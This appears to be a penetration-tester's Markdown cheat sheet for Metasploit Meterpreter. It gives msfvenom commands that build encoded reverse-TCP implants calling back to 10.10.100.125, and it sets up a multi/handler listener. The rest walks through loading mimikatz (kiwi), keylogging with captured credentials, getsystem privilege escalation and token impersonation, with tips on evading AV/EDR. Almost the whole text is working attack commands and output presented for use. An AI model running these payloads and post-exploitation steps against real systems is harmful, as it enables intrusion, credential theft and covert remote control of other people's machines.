# Meterpreter Payload Generation
```

msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.100.125 LPORT=8080 -e x64/xor_dynamic -i 3 --smallest -a x64 -f exe  -o meterpreter_win_x64.exe
msfvenom -p windows/meterpreter_reverse_tcp LHOST=10.10.100.125 LPORT=8080 -e x86/shikata_ga_nai -i 3 --smallest -a x86 -f exe -o meterpreter_win_x86.exe


msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=10.10.100.125 LPORT=8080 -e x64/xor_dynamic -i 3 --smallest -a x64 -f elf -o meterpreter_nix_x64.elf
msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=10.10.100.125 LPORT=8080 -e x86/shikata_ga_nai -i 3 --smallest -a x86 -f elf -o meterpreter_nix_x86.elf


```

# Listener / Handler
```
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp

msf6 exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_tcp
payload => windows/x64/meterpreter_reverse_tcp

msf6 exploit(multi/handler) > set lhost eth0
lhost => eth0

msf6 exploit(multi/handler) > set lport 4444
lport => 4444

# Optional
# Not loading meterpreters API automatically at runtime can assist with evading detections
msf6 exploit(multi/handler) > set AutoLoadStdapi false
AutoLoadStdapi => false

# Confirm
msf6 exploit(multi/handler) > options 

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/x64/meterpreter_reverse_tcp):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   EXITFUNC    process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   EXTENSIONS                   no        Comma-separate list of extensions to load
   EXTINIT                      no        Initialization strings for extensions
   LHOST       eth0             yes       The listen address (an interface may be specified)
   LPORT       4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target

# Run the handler as a job and wait for the call back

msf6 exploit(multi/handler) > exploit -j
[*] Exploit running as background job 1.
[*] Exploit completed, but no session was created.
msf6 exploit(multi/handler) > 
[*] Started reverse TCP handler on 10.10.100.125:4444 

msf6 exploit(multi/handler) > [*] Meterpreter session 1 opened (10.10.100.125:4444 -> 10.10.100.100:13485) at 2024-03-07 15:14:19 -0600

msf6 exploit(multi/handler) > sessions 

Active sessions
===============

  Id  Name  Type                     Information  Connection
  --  ----  ----                     -----------  ----------
  1         meterpreter x64/windows               10.10.100.125:4444 -> 10.10.100.100:13485 (10.10.100.100)


```


# Interacting with Meterpreter
```
msf6 exploit(multi/handler) > sessions -i 1 
[*] Starting interaction with 1...

# Load and tabkey to display loadable modules
meterpreter > load 
load bofloader   load extapi      load kiwi        load peinjector  load priv        load sniffer     load unhook      
load espia       load incognito   load lanattacks  load powershell  load python      load stdapi      load winpmem

# if you disabled the api, load that first.
# if evasion is a consideration, only load what you need, not everything. (until defence has been disabled)

meterpreter > load stdapi 
Loading extension stdapi...Success.

meterpreter > load kiwi 
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
meterpreter > load powershell 
Loading extension powershell...Success.
meterpreter > load incognito 
Loading extension incognito...Success.

meterpreter > help

Core Commands
=============

    Command       Description
    -------       -----------
    ?             Help menu
    background    Backgrounds the current session
    bg            Alias for background
    bgkill        Kills a background meterpreter script
    bglist        Lists running background scripts
.....


# It is worth taking some time to load all of the modules, and take notes on what you may find useful to you.

```

# Keylogging

Depending on the context in which your implant is currently running under, along with the privileges you currently have, it may be beneficial to begin logging keystrokes in an attempt to capture user credentials or other valuable material. 
Key logging is available through the `Stdapi` module, along with various other Commands. This is especially useful when you're seeking to move to another account.

```
meterpreter > help Stdapi

Stdapi: User interface Commands
===============================

    Command       Description
    -------       -----------
    keyboard_send Send keystrokes
    keyevent      Send key events
    keyscan_dump  Dump the keystroke buffer
    keyscan_start  Start capturing keystrokes
    keyscan_stop  Stop capturing keystrokes
    mouse         Send mouse events
    screenshare   Watch the remote user desktop in real time
    screenshot    Grab a screenshot of the interactive desktop
    setdesktop    Change the meterpreters current desktop
    uictl         Control some of the user interface components


meterpreter > getuid 
Server username: DESKTOP-99218I9\Administrator

meterpreter > keyscan_start 
Starting the keystroke sniffer ...

meterpreter > keyscan_dump 
Dumping captured keystrokes...
admin<Right Shift>_account<CR>
<Right Shift>P@ssw0rd123<Right Shift>!!<CR>
```


# getsystem

First, you should read over the source code to the `getsystem` module prior to blindly running it to begin understanding what is happening upon execution. Google things you don't know and read about them.
https://github.com/rapid7/metasploit-payloads/blob/master/c/meterpreter/source/extensions/priv/elevate.c#L70

```
meterpreter > load priv 
Loading extension priv...Success.

meterpreter > help priv

Priv: Timestomp Commands
========================
    Command       Description
    -------       -----------
    timestomp     Manipulate file MACE attributes


Priv: Password database Commands
================================
    Command       Description
    -------       -----------
    hashdump      Dumps the contents of the SAM database


Priv: Elevate Commands
======================
    Command       Description
    -------       -----------
    getsystem     Attempt to elevate your privilege to that of local system.


meterpreter > getsystem -h
Usage: getsystem [options]

Attempt to elevate your privilege to that of local system.

OPTIONS:

    -h   Help Banner.
    -t   The technique to use. (Default to '0').
		0 : All techniques available
		1 : Named Pipe Impersonation (In Memory/Admin)
		2 : Named Pipe Impersonation (Dropper/Admin)
		3 : Token Duplication (In Memory/Admin)
		4 : Named Pipe Impersonation (RPCSS variant)
		5 : Named Pipe Impersonation (PrintSpooler variant)
		6 : Named Pipe Impersonation (EFSRPC variant - AKA EfsPotato)

# If any AV/EDR is activly running, it will kill your shell. You will need to take care of that first.

meterpreter > getsystem 
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
```

# Access Tokens
See [[Access Tokens]] for more information.
>[!note] impersonate_token and steal_token are completely different commands.
#### List Available Tokens

```
meterpreter > list_tokens 
Usage: list_tokens <list_order_option>

Lists all accessible tokens and their privilege level

OPTIONS:

    -g  List tokens by unique groupname
    -u  List tokens by unique username

```

#### By Group
```
meterpreter > list_tokens -g
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
BUILTIN\Administrators
BUILTIN\Remote Desktop Users
BUILTIN\Users
NT AUTHORITY\Authenticated Users
NT AUTHORITY\INTERACTIVE
NT AUTHORITY\Local account
NT AUTHORITY\Local account and member of Administrators group
NT AUTHORITY\LogonSessionId_0_3365014
NT AUTHORITY\NTLM Authentication
NT AUTHORITY\REMOTE INTERACTIVE LOGON
NT AUTHORITY\This Organization

Impersonation Tokens Available
========================================
No tokens available

```

#### By User
```
meterpreter > list_tokens -u
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
DESKTOP-99218I9\Administrator
NT AUTHORITY\SYSTEM

Impersonation Tokens Available
========================================
No tokens available
```

#### Steal a token
```
meterpreter > impersonate_token DESKTOP-99218I9\\Administrator
[+] Delegation token available
[+] Successfully impersonated user DESKTOP-99218I9\Administrator

meterpreter > getuid 
Server username: DESKTOP-99218I9\Administrator

# This is useful when you want to go from system to AD/User.

meterpreter > getprivs 
[-] stdapi_sys_config_getprivs: Operation failed: Access is denied.

# Keep in mind you will no longer have your previous privs as before.

meterpreter > rev2self 
meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM

# rev2self will revert you back to your original token

```
